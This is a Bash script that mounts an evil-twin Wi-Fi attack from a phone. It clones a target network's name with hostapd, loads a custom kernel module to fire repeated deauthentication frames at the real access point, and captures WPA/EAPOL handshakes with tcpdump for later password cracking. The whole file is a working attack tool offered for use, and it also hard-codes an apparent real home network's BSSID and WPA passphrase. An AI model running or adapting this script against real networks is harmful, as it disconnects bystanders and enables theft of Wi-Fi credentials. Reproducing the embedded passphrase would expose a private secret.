#!/bin/bash
# evil_twin.sh - Evil twin AP + deauth handshake capture
# Runs on PHONE. Uses STA+AP concurrent mode.
# Deauths clients from real AP → clients connect to our fake AP → capture EAPOL
#
# Args: TARGET_BSSID TARGET_SSID FREQ CHANNEL [ROUNDS] [CAPTURE_SEC]

set -o pipefail

TARGET_BSSID="$1"   # e.g. 86:1a:24:58:59:1c
TARGET_SSID="$2"    # e.g. CMCC-Hf9K
FREQ="$3"           # e.g. 2437
CHANNEL="$4"        # e.g. 6
ROUNDS="${5:-10}"
CAPTURE_SEC="${6:-30}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"
FAKE_PSK="EvilTwinDummyKey12345678"

echo ""
echo "============================================"
echo " Evil Twin Capture"
echo " Target: $TARGET_SSID ($TARGET_BSSID)"
echo " Freq: ${FREQ}MHz  Ch: $CHANNEL"
echo " Rounds: $ROUNDS  Capture: ${CAPTURE_SEC}s"
echo "============================================"
echo ""

# Determine hw_mode based on frequency
if [ "$FREQ" -ge 5000 ]; then
    HW_MODE="a"
else
    HW_MODE="g"
fi

wait_iface() {
    local iface="$1"
    for i in $(seq 1 100); do
        [ -e "/sys/class/net/$iface" ] && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall hostapd wpa_supplicant tcpdump 2>/dev/null
    ip link set ap0 down 2>/dev/null
    iw dev ap0 del 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null
    wait_iface wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

BSSID_LOWER=$(echo "$TARGET_BSSID" | tr 'A-F' 'a-f')

# ===== Step 1: Load STA driver =====
echo "[1] Loading STA driver..."
systemctl stop NetworkManager 2>/dev/null
killall wpa_supplicant hostapd tcpdump 2>/dev/null; sleep 0.5
rmmod wlan 2>/dev/null; sleep 1
insmod "$DRIVER"
wait_iface wlan0 || { echo "[!] wlan0 not found"; exit 1; }
sleep 2
ip link set wlan0 up; sleep 0.5

# ===== Step 2: Create AP interface =====
echo "[2] Creating AP interface..."
PHY=$(iw dev wlan0 info 2>/dev/null | grep wiphy | awk '{print $2}')
iw phy "phy$PHY" interface add ap0 type __ap 2>&1
wait_iface ap0 || { echo "[!] ap0 creation failed"; exit 1; }

# Verify ap0 type
AP_TYPE=$(iw dev ap0 info 2>/dev/null | grep type | awk '{print $2}')
echo "  ap0 type: $AP_TYPE"

# ===== Step 3: Configure and start hostapd =====
echo "[3] Starting hostapd..."
cat > /tmp/hostapd_evil.conf << HAPEOF
interface=ap0
driver=nl80211
ssid=$TARGET_SSID
hw_mode=$HW_MODE
channel=$CHANNEL
wpa=2
wpa_passphrase=$FAKE_PSK
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wmm_enabled=1
logger_syslog=-1
logger_syslog_level=2
ignore_broadcast_ssid=0
HAPEOF

hostapd -B /tmp/hostapd_evil.conf 2>&1
HAPD_RET=$?
sleep 1

if [ "$HAPD_RET" -ne 0 ]; then
    echo "  [!] hostapd failed (exit=$HAPD_RET)"
    # Try without wmm
    sed -i 's/wmm_enabled=1/wmm_enabled=0/' /tmp/hostapd_evil.conf
    hostapd -B /tmp/hostapd_evil.conf 2>&1
    HAPD_RET=$?
    sleep 1
    [ "$HAPD_RET" -ne 0 ] && { echo "  [!] hostapd failed again"; exit 1; }
fi

echo "  hostapd running"
iw dev ap0 info 2>/dev/null | head -8

# ===== Step 4: Start capture on ap0 =====
echo "[4] Starting capture..."
PCAP="/tmp/evil_twin_${BSSID_LOWER//:/}.pcap"
rm -f "$PCAP"
tcpdump -i ap0 -w "$PCAP" 2>/dev/null &
TCPID=$!

# Also capture on wlan0 if possible (STA side)
PCAP_STA="/tmp/evil_twin_sta_${BSSID_LOWER//:/}.pcap"
rm -f "$PCAP_STA"

# ===== Step 5: WPA supplicant config for STA =====
cat > /tmp/wpa_evil.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$TARGET_SSID"
    bssid=$TARGET_BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

# ===== Rounds =====
HANDSHAKE_FOUND=0
for round in $(seq 1 "$ROUNDS"); do
    echo ""
    echo "========== ROUND $round/$ROUNDS =========="

    # Connect STA to target AP
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    killall wpa_supplicant 2>/dev/null; sleep 0.2
    dmesg -C
    wpa_supplicant -i wlan0 -c /tmp/wpa_evil.conf -B -D nl80211 2>/dev/null

    PE_FOUND=0
    for w in $(seq 1 200); do
        if dmesg | tail -50 | grep -q "Connecting to"; then
            PE_FOUND=1; break
        fi
        sleep 0.05
    done

    if [ "$PE_FOUND" -eq 0 ]; then
        echo "  [-] No PE session"; continue
    fi

    # Wait for TX power
    TXPWR="0.00"
    for tp in $(seq 1 100); do
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        [ -n "$TXPWR" ] && [ "$TXPWR" != "0.00" ] && break
        sleep 0.1
    done
    echo "  [*] TX power: ${TXPWR} dBm"

    # Fire deauths
    DEAUTH_OK=0
    echo -n "  [*] Deauths: "
    for f in $(seq 1 5); do
        dmesg -C
        insmod /tmp/petx11.ko 2>/dev/null
        if dmesg | grep -q "Deauth TX"; then
            DEAUTH_OK=$((DEAUTH_OK + 1)); echo -n "+"
        else
            echo -n "x"
        fi
        sleep 0.3
    done
    echo " ($DEAUTH_OK/5)"
    [ "$DEAUTH_OK" -eq 0 ] && { echo "  [-] No deauths sent"; continue; }

    # Wait for clients to connect to our AP
    echo "  [*] Waiting ${CAPTURE_SEC}s for clients..."
    sleep "$CAPTURE_SEC"

    # Check for EAPOL in capture
    if [ -f "$PCAP" ] && [ "$(stat -c%s "$PCAP" 2>/dev/null)" -gt 24 ]; then
        ECOUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        ECOUNT=$(echo "$ECOUNT" | tr -d '[:space:]')
        [ -z "$ECOUNT" ] && ECOUNT=0
        FSIZE=$(stat -c%s "$PCAP" 2>/dev/null)
        echo "  [*] AP capture: ${FSIZE}B, EAPOL: $ECOUNT"

        if [ "$ECOUNT" -gt 0 ]; then
            echo "  [!!!] EAPOL DETECTED on AP!"
            HANDSHAKE_FOUND=1
            cp "$PCAP" "/tmp/handshake_evil_${BSSID_LOWER//:/}.pcap"
            break
        fi
    fi

    # Also check dmesg for hostapd activity
    if dmesg | grep -qi "STA.*associated\|new station\|WPA:.*PTKSTART"; then
        echo "  [*] Client associated to our AP!"
        dmesg | grep -i "STA\|station\|WPA\|EAPOL" | tail -5
    fi
done

kill $TCPID 2>/dev/null
wait $TCPID 2>/dev/null

echo ""
echo "============================================"
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo " SUCCESS: /tmp/handshake_evil_${BSSID_LOWER//:/}.pcap"
else
    echo " No handshake captured in $ROUNDS rounds"
fi
echo "============================================"
exit $((1 - HANDSHAKE_FOUND))
